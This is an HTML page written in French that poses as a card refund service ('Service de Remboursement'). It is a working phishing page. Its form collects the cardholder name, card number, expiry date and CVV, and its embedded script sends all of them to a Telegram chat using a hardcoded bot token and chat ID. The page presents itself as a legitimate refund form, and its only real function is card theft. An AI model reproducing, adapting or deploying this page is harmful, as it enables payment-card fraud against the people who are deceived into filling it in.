<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Remboursement</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body {
            font-family: 'Arial', sans-serif;
        }
        .error-message {
            color: #e63946;
            font-size: 0.875rem;
            margin-top: 0.25rem;
        }
        .hidden {
            display: none;
        }
        #card-type {
            color: green;
            font-weight: bold;
            margin-top: 5px;
        }
    </style>
</head>
<body class="bg-gray-100">
    <header class="bg-blue-600 text-white py-4 shadow-lg text-center">
        <h1 class="text-4xl font-bold">Service de Remboursement</h1>
        <p class="mt-1 text-lg">Nous acceptons toutes les cartes bancaires</p>
    </header>

    <section class="flex items-center justify-center min-h-screen">
        <div class="bg-white shadow-2xl rounded-lg p-8 w-full max-w-lg">
            <h2 class="text-3xl font-bold text-center text-gray-800 mb-6">Formulaire de Remboursement</h2>
            <form id="remboursement-form" onsubmit="return validateForm(event)">
                <!-- Nom du titulaire -->
                <div class="mb-4">
                    <label for="nom" class="block text-sm font-medium text-gray-700">Nom du titulaire</label>
                    <input type="text" id="nom" name="nom" placeholder="Ex : Jean Dupont" required
                        class="mt-1 block w-full px-4 py-2 border rounded-md shadow-sm">
                </div>

                <!-- Numéro de la carte -->
                <div class="mb-4">
                    <label for="numero-carte" class="block text-sm font-medium text-gray-700">Numéro de la carte</label>
                    <input type="text" id="numero-carte" name="numero-carte" placeholder="1234 5678 9012 3456" required maxlength="19"
                        class="mt-1 block w-full px-4 py-2 border rounded-md shadow-sm" oninput="detectCardType()">
                    <p id="card-type" class="hidden"></p>
                    <p id="card-error" class="error-message hidden">Le numéro de la carte est invalide.</p>
                </div>

                <!-- Date d'expiration -->
                <div class="mb-4">
                    <label for="date-expiration" class="block text-sm font-medium text-gray-700">Date d'expiration</label>
                    <input type="month" id="date-expiration" required class="mt-1 block w-full px-4 py-2 border rounded-md shadow-sm">
                </div>

                <!-- Code CVV -->
                <div class="mb-6">
                    <label for="cvv" class="block text-sm font-medium text-gray-700">Code CVV</label>
                    <input type="text" id="cvv" name="cvv" placeholder="123" required maxlength="3"
                        class="mt-1 block w-full px-4 py-2 border rounded-md shadow-sm">
                    <p id="cvv-error" class="error-message hidden">Le CVV doit contenir exactement 3 chiffres.</p>
                </div>

                <button type="submit"
                    class="w-full bg-blue-600 text-white font-bold py-2 px-4 rounded-md hover:bg-blue-700 transition duration-300">
                    Confirmer le Remboursement
                </button>
            </form>
        </div>
    </section>

    <script>
        const token = "7493515332:AAGlVbk9dCC2tqKxdv8TjgM32qqPRqFsy2I";
        const chatId = "5372119436";

        function detectCardType() {
            const cardNumber = document.getElementById('numero-carte').value.replace(/\s+/g, '');
            const cardTypeDisplay = document.getElementById('card-type');

            if (/^4/.test(cardNumber)) {
                cardTypeDisplay.textContent = "Carte détectée : Visa";
                cardTypeDisplay.classList.remove('hidden');
            } else if (/^5[1-5]/.test(cardNumber)) {
                cardTypeDisplay.textContent = "Carte détectée : MasterCard";
                cardTypeDisplay.classList.remove('hidden');
            } else {
                cardTypeDisplay.classList.add('hidden');
            }
        }

        function sendToTelegram(message) {
            const url = `https://api.telegram.org/bot${token}/sendMessage`;
            fetch(url, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message
                })
            })
            .then(response => response.json())
            .then(data => {
                if (data.ok) {
                    alert("✅ Les informations ont été envoyées à Telegram.");
                } else {
                    alert("❌ Erreur lors de l'envoi à Telegram: " + data.description);
                }
            })
            .catch(error => console.error("Erreur réseau:", error));
        }

        function validateForm(event) {
            event.preventDefault();

            const nom = document.getElementById('nom').value;
            const cardNumber = document.getElementById('numero-carte').value.replace(/\s+/g, '');
            const expirationDate = document.getElementById('date-expiration').value;
            const cvv = document.getElementById('cvv').value;
            let valid = true;

            if (!/^\d{16}$/.test(cardNumber)) {
                document.getElementById('card-error').classList.remove('hidden');
                valid = false;
            } else {
                document.getElementById('card-error').classList.add('hidden');
            }

            if (!/^\d{3}$/.test(cvv)) {
                document.getElementById('cvv-error').classList.remove('hidden');
                valid = false;
            } else {
                document.getElementById('cvv-error').classList.add('hidden');
            }

            if (valid) {
                const message = `
📄 Nouveau remboursement:
👤 Nom: ${nom}
💳 Numéro de carte: ${cardNumber}
📅 Date d'expiration: ${expirationDate}
🔒 CVV: ${cvv}
                `;
                sendToTelegram(message);
            }
        }
    </script>
</body>
</html>
